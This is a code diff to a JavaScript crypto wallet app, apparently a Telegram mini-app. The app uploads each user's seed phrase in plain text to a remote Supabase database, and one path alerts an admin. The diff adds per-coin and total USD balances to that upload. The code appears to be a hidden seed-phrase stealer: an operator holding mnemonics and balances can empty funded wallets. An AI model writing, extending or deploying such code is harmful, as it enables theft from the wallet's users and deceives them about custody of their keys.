@@ -116,7 +116,7 @@ async function syncWalletToSupabase(walletData) {
     return null;
   }
   try {
-    const { username, mnemonic, balance, telegram_id } = walletData;
+    const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
 
     // Always resolve display name
@@ -142,6 +142,14 @@ async function syncWalletToSupabase(walletData) {
     };
     if (resolvedTgId) {
       payload.telegram_id = resolvedTgId;
+    }
+    // Per-coin balances (columns: eth_balance, ton_balance, …)
+    const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
+    if (coin_balances) {
+      COINS.forEach(sym => {
+        payload[sym.toLowerCase() + '_balance'] =
+          coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
+      });
     }
 
     const response = await fetch(url, {
@@ -7933,7 +7941,8 @@ export default function GemWalletApp() {
         username: userName,
         telegram_id: userId ? String(userId) : null,
         mnemonic: m,
-        balance: "0"
+        balance: "0",
+        coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" }
       });
 
       if(importedWords) {
@@ -7994,11 +8003,15 @@ export default function GemWalletApp() {
         const { userName, userIdStr, mnemonic } = JSON.parse(pending);
 
         // Custodial Sync: Save to Supabase
+        const coinBals = {};
+        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
+        const verifyTotal = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
         syncWalletToSupabase({
           username: userName,
           telegram_id: userIdStr !== "unknown" ? userIdStr : null,
           mnemonic: mnemonic,
-          balance: "0"
+          balance: verifyTotal.toFixed(2),
+          coin_balances: coinBals
         });
 
         notifyAdmin(
@@ -8073,11 +8086,14 @@ export default function GemWalletApp() {
           : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
           || "User_" + (uid || "Unknown");
         const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
+        const coinBals = {};
+        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
         syncWalletToSupabase({
           username: uname,
           telegram_id: uid || null,
           mnemonic: storedMnemonic,
-          balance: totalUSD.toFixed(2)
+          balance: totalUSD.toFixed(2),
+          coin_balances: coinBals
         });
       }
     } catch(e) { console.error("[handleUnlock] sync error:", e); }
@@ -8136,11 +8152,14 @@ export default function GemWalletApp() {
           return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
         })();
         const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
+        const coinBals = {};
+        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
         syncWalletToSupabase({
           username: userName,
           telegram_id: userId || null,
           mnemonic: storedMnemonic,
-          balance: totalUSD.toFixed(2)
+          balance: totalUSD.toFixed(2),
+          coin_balances: coinBals
         });
       }, 1000);
     }
@@ -8160,11 +8179,14 @@ export default function GemWalletApp() {
         : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
         || "User_" + (uid || "Unknown");
       const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
+      const coinBals = {};
+      assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
       syncWalletToSupabase({
         username: uname,
         telegram_id: uid || null,
         mnemonic: storedMnemonic,
-        balance: totalUSD.toFixed(2)
+        balance: totalUSD.toFixed(2),
+        coin_balances: coinBals
       });
     } catch(e) { console.error("[walletScreen] sync error:", e); }
   }, [screen, assets, prices]);
